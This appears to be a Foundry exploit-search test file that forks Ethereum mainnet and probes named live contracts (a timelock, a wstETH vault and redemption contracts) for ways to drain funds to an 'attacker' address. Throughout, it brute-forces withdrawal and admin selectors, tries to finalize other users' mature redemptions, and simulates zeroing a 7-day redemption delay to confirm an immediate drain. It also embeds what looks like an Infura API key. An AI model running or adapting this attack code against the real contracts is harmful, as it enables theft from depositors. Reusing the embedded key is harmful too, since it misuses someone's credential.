// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface ITimelock {
    function getMinDelay() external view returns (uint256);
    function schedule(address, uint256, bytes calldata, bytes32, bytes32, uint256) external;
    function execute(address, uint256, bytes calldata, bytes32, bytes32) external payable;
    function isOperation(bytes32) external view returns (bool);
    function isOperationPending(bytes32) external view returns (bool);
    function isOperationReady(bytes32) external view returns (bool);
    function isOperationDone(bytes32) external view returns (bool);
    function hasRole(bytes32, address) external view returns (bool);
    function PROPOSER_ROLE() external view returns (bytes32);
    function EXECUTOR_ROLE() external view returns (bytes32);
    function CANCELLER_ROLE() external view returns (bytes32);
}

/**
 * FINAL IMMEDIATE DRAIN SEARCH
 *
 * Exhaustive search for immediate drain paths.
 * Focus on:
 * 1. Timelock bypass
 * 2. Alternative VAULT withdrawal paths
 * 3. Cross-contract privilege escalation
 * 4. Storage manipulation via external calls
 */
contract FinalImmediateDrainSearch is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Timelock controller (owner of R0, VAULT, etc.)
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // VAULT slot 2 contract
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;

    // VaultSlot5 contract
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TimelockRoleAnalysis() public view {
        console.log("=== TIMELOCK ROLE ANALYSIS ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        console.log("Min delay:", timelock.getMinDelay(), "seconds");
        console.log("Min delay in days:", timelock.getMinDelay() / 86400);

        // Get roles
        bytes32 proposerRole = timelock.PROPOSER_ROLE();
        bytes32 executorRole = timelock.EXECUTOR_ROLE();
        bytes32 cancellerRole = timelock.CANCELLER_ROLE();

        console.log("\nProposer role:");
        console.logBytes32(proposerRole);
        console.log("Executor role:");
        console.logBytes32(executorRole);
        console.log("Canceller role:");
        console.logBytes32(cancellerRole);

        // Check if attacker or common addresses have roles
        console.log("\nRole checks:");
        console.log("attacker is proposer:", timelock.hasRole(proposerRole, attacker));
        console.log("attacker is executor:", timelock.hasRole(executorRole, attacker));
        console.log("address(0) is executor:", timelock.hasRole(executorRole, address(0)));

        // Check if there are any ready operations
        // We'd need to scan for operation hashes
    }

    function test_ExploitTimelockDirectExecute() public {
        console.log("=== EXPLOIT TIMELOCK DIRECT EXECUTE ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // If executor role is open (address(0)), anyone can execute ready ops

        bytes32 executorRole = timelock.EXECUTOR_ROLE();
        bool openExecutor = timelock.hasRole(executorRole, address(0));
        console.log("Open executor (address(0) has role):", openExecutor);

        if (openExecutor) {
            console.log("\n*** EXECUTOR ROLE IS OPEN! ***");
            console.log("Anyone can execute ready operations!");

            // Try to execute a setDelay operation
            // Would need to know the operation hash or scan for pending ops
        }

        // Try various operation patterns
        vm.startPrank(attacker);

        // Try to execute with zero predecessor and empty salt
        bytes memory setDelayCall = abi.encodeWithSignature("setDelay(uint32)", 0);

        // Calculate operation hash
        bytes32 opHash = keccak256(
            abi.encode(
                R0,           // target
                0,            // value
                setDelayCall, // data
                bytes32(0),   // predecessor
                bytes32(0)    // salt
            )
        );

        console.log("\nOperation hash for setDelay(0):");
        console.logBytes32(opHash);

        bool isPending = timelock.isOperationPending(opHash);
        bool isReady = timelock.isOperationReady(opHash);
        bool isDone = timelock.isOperationDone(opHash);

        console.log("Is pending:", isPending);
        console.log("Is ready:", isReady);
        console.log("Is done:", isDone);

        if (isReady) {
            console.log("\n*** OPERATION IS READY! ***");
            try timelock.execute(R0, 0, setDelayCall, bytes32(0), bytes32(0)) {
                console.log("Execute succeeded!");
            } catch {
                console.log("Execute failed");
            }
        }

        vm.stopPrank();
    }

    function test_ExploreVAULTSlot2Contract() public {
        console.log("=== EXPLORE VAULT SLOT 2 CONTRACT ===\n");

        console.log("VAULT_SLOT2:", VAULT_SLOT2);
        console.log("Code size:", VAULT_SLOT2.code.length);

        // Check storage slots
        console.log("\nStorage slots 0-5:");
        for (uint i = 0; i <= 5; i++) {
            bytes32 slot = vm.load(VAULT_SLOT2, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        // Try various function signatures
        bytes4[] memory sigs = new bytes4[](20);
        sigs[0] = bytes4(keccak256("withdraw(uint256)"));
        sigs[1] = bytes4(keccak256("withdraw(address,uint256)"));
        sigs[2] = bytes4(keccak256("deposit(uint256)"));
        sigs[3] = bytes4(keccak256("execute(address,uint256,bytes)"));
        sigs[4] = bytes4(keccak256("call(address,bytes)"));
        sigs[5] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[6] = bytes4(keccak256("approve(address,uint256)"));
        sigs[7] = bytes4(keccak256("setApproval(address,uint256)"));
        sigs[8] = bytes4(keccak256("requestWithdraw(uint256)"));
        sigs[9] = bytes4(keccak256("processWithdraw()"));
        sigs[10] = bytes4(keccak256("claimWithdraw()"));
        sigs[11] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[12] = bytes4(keccak256("rescue(address)"));
        sigs[13] = bytes4(keccak256("sweep(address)"));
        sigs[14] = bytes4(keccak256("sendToken(address,address,uint256)"));
        sigs[15] = bytes4(keccak256("pullFunds(address,uint256)"));
        sigs[16] = bytes4(keccak256("pushFunds(address,uint256)"));
        sigs[17] = bytes4(keccak256("rebalance()"));
        sigs[18] = bytes4(keccak256("harvest()"));
        sigs[19] = bytes4(keccak256("compound()"));

        vm.startPrank(attacker);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("\nTrying function signatures...");
        for (uint i = 0; i < sigs.length; i++) {
            bytes memory data;
            if (i <= 1 || i == 5 || i == 7 || i == 8) {
                data = abi.encodeWithSelector(sigs[i], 1000e18);
            } else if (i == 3 || i == 4) {
                bytes memory callData = abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18);
                data = abi.encodeWithSelector(sigs[i], wstETH, 0, callData);
            } else if (i >= 12 && i <= 14) {
                data = abi.encodeWithSelector(sigs[i], wstETH);
            } else if (i >= 15 && i <= 16) {
                data = abi.encodeWithSelector(sigs[i], attacker, 1000e18);
            } else {
                data = abi.encodeWithSelector(sigs[i]);
            }

            (bool success,) = VAULT_SLOT2.call(data);
            if (success) {
                console.log("*** Success with selector", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);
    }

    function test_ExploreVAULTSlot5Contract() public {
        console.log("=== EXPLORE VAULT SLOT 5 CONTRACT ===\n");

        console.log("VAULT_SLOT5:", VAULT_SLOT5);
        console.log("Code size:", VAULT_SLOT5.code.length);

        // Check storage slots
        console.log("\nStorage slots 0-5:");
        for (uint i = 0; i <= 5; i++) {
            bytes32 slot = vm.load(VAULT_SLOT5, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        // Try withdrawal functions
        vm.startPrank(attacker);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("withdraw(uint256)"));
        sigs[1] = bytes4(keccak256("withdraw(address,uint256)"));
        sigs[2] = bytes4(keccak256("withdrawAll()"));
        sigs[3] = bytes4(keccak256("claim()"));
        sigs[4] = bytes4(keccak256("claimAll()"));
        sigs[5] = bytes4(keccak256("execute(address,uint256,bytes)"));
        sigs[6] = bytes4(keccak256("processWithdrawal(uint256)"));
        sigs[7] = bytes4(keccak256("finalizeWithdrawal(uint256)"));
        sigs[8] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[9] = bytes4(keccak256("rescue(address,uint256)"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = VAULT_SLOT5.call{gas: 500000}(abi.encodeWithSelector(sigs[i], 1000e18));
            if (success) {
                console.log("Success with selector", i);
            }
        }

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);
    }

    function test_SearchForMatureRedemptions() public {
        console.log("=== SEARCH FOR MATURE REDEMPTIONS ===\n");

        // Scan for any redemptions that might already be mature
        // We need to check many addresses

        // Get current block timestamp
        console.log("Current timestamp:", block.timestamp);

        // Calculate how old a redemption would need to be to be mature
        // With 7 day delay (604800 seconds)
        uint256 matureBy = block.timestamp - 604800;
        console.log("Redemptions created before this timestamp are mature:", matureBy);

        // Try to finalize for various addresses
        address[] memory testAddrs = new address[](20);
        testAddrs[0] = address(0);
        testAddrs[1] = address(1);
        testAddrs[2] = address(2);
        testAddrs[3] = VAULT;
        testAddrs[4] = R0;
        testAddrs[5] = RC;
        testAddrs[6] = TIMELOCK;
        testAddrs[7] = VAULT_SLOT2;
        testAddrs[8] = VAULT_SLOT5;
        testAddrs[9] = TASSET;
        testAddrs[10] = 0xdEad000000000000000000000000000000000000;
        testAddrs[11] = 0x000000000000000000000000000000000000dEaD;
        testAddrs[12] = address(uint160(uint256(keccak256("test1"))));
        testAddrs[13] = address(uint160(uint256(keccak256("test2"))));
        testAddrs[14] = address(uint160(uint256(keccak256("treasury"))));
        testAddrs[15] = address(uint160(uint256(keccak256("admin"))));
        testAddrs[16] = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
        testAddrs[17] = address(this);
        testAddrs[18] = attacker;
        testAddrs[19] = tx.origin;

        for (uint a = 0; a < testAddrs.length; a++) {
            // Calculate redemptions array slot
            bytes32 arrayLengthSlot = keccak256(abi.encode(testAddrs[a], uint256(5)));
            bytes32 lengthData = vm.load(R0, arrayLengthSlot);
            uint256 length = uint256(lengthData);

            if (length > 0) {
                console.log("\n*** Found redemption for:", testAddrs[a]);
                console.log("Count:", length);

                bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));

                for (uint j = 0; j < length && j < 3; j++) {
                    bytes32 slot0 = vm.load(R0, bytes32(uint256(baseSlot) + j * 2));

                    uint96 maturity = uint96(uint256(slot0));
                    uint96 amount = uint96(uint256(slot0) >> 96);

                    console.log("  Redemption", j);
                    console.log("    Maturity:", maturity);
                    console.log("    Amount:", uint256(amount) / 1e18);
                    console.log("    Is mature:", block.timestamp >= maturity);

                    if (block.timestamp >= maturity) {
                        console.log("    *** THIS REDEMPTION IS READY! ***");

                        // Try to finalize
                        vm.startPrank(attacker);
                        (bool success,) = R0.call(
                            abi.encodeWithSignature("finalizeRedeemFor(address,uint256)", testAddrs[a], j)
                        );
                        console.log("    Finalize attempt:", success);
                        vm.stopPrank();
                    }
                }
            }
        }
    }

    function test_VaultDirectAccessViaRC() public {
        console.log("=== VAULT DIRECT ACCESS VIA RC ===\n");

        // RC has unlimited allowance from VAULT
        // If we can make any call appear to come from RC...

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        uint256 rcAllowance = IERC20(wstETH).allowance(VAULT, RC);

        console.log("VAULT wstETH balance:", vaultBalance / 1e18);
        console.log("RC allowance from VAULT: UNLIMITED");

        // Check VAULT's functions for any that might use RC's allowance
        console.log("\nChecking if VAULT has functions that use RC allowance...");

        // Check VAULT storage for RC reference
        bytes32 vaultSlot6 = vm.load(VAULT, bytes32(uint256(6)));
        console.log("VAULT slot 6 (likely RC ref):");
        console.logBytes32(vaultSlot6);
        console.log("As address:", address(uint160(uint256(vaultSlot6))));

        // Try calling VAULT functions that might trigger transfer via RC
        vm.startPrank(attacker);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        // Try various VAULT functions
        bytes4[] memory sigs = new bytes4[](15);
        sigs[0] = bytes4(keccak256("sendRedemption(address,uint256)"));
        sigs[1] = bytes4(keccak256("processRedemption(address,uint256)"));
        sigs[2] = bytes4(keccak256("executeRedemption(address,uint256)"));
        sigs[3] = bytes4(keccak256("transferToRedemption(address,uint256)"));
        sigs[4] = bytes4(keccak256("claimFromVault(uint256)"));
        sigs[5] = bytes4(keccak256("withdrawFromVault(uint256)"));
        sigs[6] = bytes4(keccak256("pullFromVault(address,uint256)"));
        sigs[7] = bytes4(keccak256("redeemFromVault(uint256)"));
        sigs[8] = bytes4(keccak256("exitVault(uint256)"));
        sigs[9] = bytes4(keccak256("unstake(uint256)"));
        sigs[10] = bytes4(keccak256("unwrap(uint256)"));
        sigs[11] = bytes4(keccak256("convertToAssets(uint256)"));
        sigs[12] = bytes4(keccak256("previewWithdraw(uint256)"));
        sigs[13] = bytes4(keccak256("maxWithdraw(address)"));
        sigs[14] = bytes4(keccak256("withdraw(uint256,address,address)"));

        for (uint i = 0; i < sigs.length; i++) {
            bytes memory data;
            if (i <= 3 || i == 6) {
                data = abi.encodeWithSelector(sigs[i], attacker, 1000e18);
            } else if (i == 14) {
                data = abi.encodeWithSelector(sigs[i], 1000e18, attacker, attacker);
            } else {
                data = abi.encodeWithSelector(sigs[i], 1000e18);
            }

            (bool success,) = VAULT.call(data);
            if (success) {
                console.log("*** Success with selector", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);
    }

    function test_SimulateDelayZeroExploit() public {
        console.log("=== SIMULATE DELAY=0 EXPLOIT ===\n");

        // This simulates what would happen if delay was 0
        // (which is the 7-day exploit, just proving it works)

        // Set delay to 0 using vm.store
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Original slot 4:");
        console.logBytes32(slot4);

        // Extract delay (bits 96-127)
        uint32 originalDelay = uint32(uint256(slot4) >> 96);
        console.log("Original delay:", originalDelay, "seconds");

        // Set delay to 0
        uint256 newSlot4 = uint256(slot4) & ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(newSlot4));

        bytes32 modifiedSlot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Modified slot 4:");
        console.logBytes32(modifiedSlot4);

        uint32 newDelay = uint32(uint256(modifiedSlot4) >> 96);
        console.log("New delay:", newDelay, "seconds");

        // Now try the attack
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH before:", wstethBefore / 1e18);

        // Redeem
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(10000e18)));

        // Immediately finalize (should work with delay=0)
        (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Immediate finalize:", success);

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("wstETH after:", wstethAfter / 1e18);
        console.log("\n*** DRAINED:", (wstethAfter - wstethBefore) / 1e18, "wstETH ***");

        if (wstethAfter > wstethBefore) {
            console.log("\nCONFIRMED: With delay=0, immediate drain is possible!");
            console.log("The only blocker is the 7-day delay in slot 4.");
        }
    }

    function test_ScanForWritableSlot4Paths() public {
        console.log("=== SCAN FOR WRITABLE SLOT 4 PATHS ===\n");

        // Final comprehensive scan for any path to write slot 4

        // 1. Check if R0 has any admin functions
        console.log("1. Checking R0 admin functions...");

        bytes4[] memory adminSigs = new bytes4[](20);
        adminSigs[0] = bytes4(keccak256("setDelay(uint32)"));
        adminSigs[1] = bytes4(keccak256("setDelay(uint256)"));
        adminSigs[2] = bytes4(keccak256("updateDelay(uint32)"));
        adminSigs[3] = bytes4(keccak256("changeDelay(uint32)"));
        adminSigs[4] = bytes4(keccak256("setRedemptionDelay(uint32)"));
        adminSigs[5] = bytes4(keccak256("setConfig(uint256,uint256)"));
        adminSigs[6] = bytes4(keccak256("setParameter(bytes32,uint256)"));
        adminSigs[7] = bytes4(keccak256("updateConfig(uint256)"));
        adminSigs[8] = bytes4(keccak256("configure(uint256,uint256)"));
        adminSigs[9] = bytes4(keccak256("setSlot(uint256,bytes32)"));
        adminSigs[10] = bytes4(keccak256("writeSlot(uint256,bytes32)"));
        adminSigs[11] = bytes4(keccak256("store(uint256,bytes32)"));
        adminSigs[12] = bytes4(keccak256("sstore(uint256,uint256)"));
        adminSigs[13] = bytes4(keccak256("setStorage(uint256,bytes32)"));
        adminSigs[14] = bytes4(keccak256("writeStorage(uint256,bytes32)"));
        adminSigs[15] = bytes4(keccak256("upgrade(address)"));
        adminSigs[16] = bytes4(keccak256("upgradeTo(address)"));
        adminSigs[17] = bytes4(keccak256("setImplementation(address)"));
        adminSigs[18] = bytes4(keccak256("initialize()"));
        adminSigs[19] = bytes4(keccak256("reinitialize(uint8)"));

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));

        vm.startPrank(attacker);

        for (uint i = 0; i < adminSigs.length; i++) {
            // Try calling as attacker
            R0.call{gas: 200000}(abi.encodeWithSelector(adminSigs[i], 0));

            bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
            if (slot4After != slot4Before) {
                console.log("*** SLOT 4 CHANGED by selector", i);
                console.logBytes4(adminSigs[i]);
            }
        }

        vm.stopPrank();

        console.log("\n2. Checking if TIMELOCK can be exploited...");

        // As attacker, try to schedule a setDelay operation
        ITimelock timelock = ITimelock(TIMELOCK);

        bytes32 executorRole = timelock.EXECUTOR_ROLE();
        bool openExecutor = timelock.hasRole(executorRole, address(0));

        if (openExecutor) {
            console.log("Executor role is OPEN!");
            // Scan for any ready operations
        } else {
            console.log("Executor role is NOT open");
        }

        console.log("\n3. Final status:");
        bytes32 finalSlot4 = vm.load(R0, bytes32(uint256(4)));
        bool unchanged = finalSlot4 == slot4Before;
        console.log("Slot 4 unchanged:", unchanged);

        if (unchanged) {
            console.log("\nCONCLUSION: No immediate path to modify delay found.");
            console.log("The 7-day delay remains the only blocker for immediate drain.");
        }
    }
}
